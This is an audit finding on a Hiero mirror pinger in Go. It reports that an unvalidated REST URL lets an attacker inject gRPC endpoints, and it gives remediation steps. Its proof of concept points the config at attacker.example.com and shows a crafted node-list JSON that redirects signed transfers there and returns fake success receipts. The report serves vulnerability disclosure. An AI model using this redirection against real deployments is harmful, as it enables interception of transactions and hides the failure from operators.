# Audit Report

## Title
Attacker-Controlled gRPC Network Injection via Unvalidated `HIERO_MIRROR_PINGER_REST` URL

## Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger builds its entire Hiero SDK network map from a URL supplied via `HIERO_MIRROR_PINGER_REST` with no URL scheme, hostname, or IP validation. An attacker who can set that environment variable to an attacker-controlled HTTP server can return a crafted JSON payload that redirects every subsequent `CryptoTransfer` to attacker-owned gRPC endpoints.

## Finding Description

**`config.go` — no URL validation on `mirrorRest`**

`loadConfig()` reads `HIERO_MIRROR_PINGER_REST` directly into `cfg.mirrorRest`. The only guard is a non-empty check when `network == "other"`: [1](#0-0) [2](#0-1) 

No URL scheme (`https://` enforcement), no hostname allowlist, and no IP range restriction are applied anywhere in `loadConfig()`.

**`sdk_client.go` — unvalidated URL passed to network builder**

`newClient()` branches on `network == "other"` and calls `buildNetworkFromMirrorNodes` with the raw, unvalidated `cfg`: [3](#0-2) 

The resulting map is passed directly to `hiero.ClientForNetwork`, making attacker endpoints the SDK's sole gRPC targets.

**`mirror_node_client.go` — URL constructed and fetched without integrity checks**

`buildNetworkFromMirrorNodes` appends `/api/v1/network/nodes` to the raw base URL with no scheme or host validation: [4](#0-3) 

`fetchMirrorNodeNetwork` makes an unauthenticated HTTP GET and decodes the response body directly into `nodesEnvelope` with no signature or integrity check: [5](#0-4) 

The `domain_name`/`ip_address_v4` and `port` fields from the attacker's JSON are used verbatim to build the network map: [6](#0-5) 

**`transfer.go` — all transactions go to the injected endpoints**

Every `CryptoTransfer` executed by `submitWithRetry` is sent through the SDK client whose network map was populated from the attacker's response: [7](#0-6) 

**Root cause:** The code assumes `cfg.mirrorRest` is always a trusted, operator-supplied URL. There is no URL scheme enforcement, no hostname/IP allowlist, no TLS requirement, and no response authenticity check.

## Impact Explanation

- **Transaction interception**: The attacker's gRPC server receives every signed `CryptoTransfer`, including transaction IDs, operator account ID, destination account ID, and amounts.
- **Fake receipt injection**: The attacker's server can return fabricated `SUCCESS` receipts, silently breaking the liveness/health-check purpose of the pinger.
- **Denial of service**: The attacker can return errors or hang connections, causing the pinger to exhaust retries and fail its readiness probe (`/tmp/ready`). [8](#0-7) 

## Likelihood Explanation

The precondition is the ability to set two environment variables at process startup. This is achievable by:
- A Kubernetes user with `edit`/`patch` on `Deployment` or `Pod` objects (common in shared clusters with coarse RBAC).
- Write access to a Helm values file, `.env` file, or CI/CD pipeline configuration.
- Any supply-chain or config-injection attack targeting deployment manifests.

No special runtime privileges are needed beyond influencing the process environment at startup. The attack is fully repeatable and requires no interaction from the legitimate operator after the env var is set.

## Recommendation

1. **Enforce HTTPS scheme**: In `loadConfig()`, after parsing `cfg.mirrorRest`, parse it with `url.Parse` and reject any URL whose scheme is not `https`.
2. **Hostname allowlist or suffix check**: Validate that the hostname matches an operator-configured allowlist or a known internal domain pattern.
3. **TLS verification**: Ensure the `http.Client` used in `fetchMirrorNodeNetwork` does not disable TLS verification and that plain `http://` URLs are rejected.
4. **Response integrity**: Consider signing the mirror node list response or pinning the expected node account IDs so that a compromised or attacker-controlled mirror node cannot inject arbitrary gRPC endpoints. [9](#0-8) 

## Proof of Concept

1. Deploy the pinger with:
   ```
   HIERO_MIRROR_PINGER_NETWORK=other
   HIERO_MIRROR_PINGER_REST=http://attacker.example.com
   ```
2. On `attacker.example.com`, serve the following at `GET /api/v1/network/nodes`:
   ```json
   {
     "nodes": [{
       "node_account_id": "0.0.3",
       "service_endpoints": [{
         "domain_name": "attacker.example.com",
         "ip_address_v4": "",
         "port": 50211
       }]
     }],
     "links": {}
   }
   ```
3. `buildNetworkFromMirrorNodes` returns `{"attacker.example.com:50211": AccountID{0,0,3}}`.
4. `hiero.ClientForNetwork` sets this as the sole gRPC target.
5. Every `CryptoTransfer` in `submitWithRetry` is now sent to `attacker.example.com:50211`.
6. The attacker's gRPC server returns a fabricated `SUCCESS` receipt; the pinger logs success and continues operating normally, unaware of the interception. [10](#0-9) [11](#0-10)
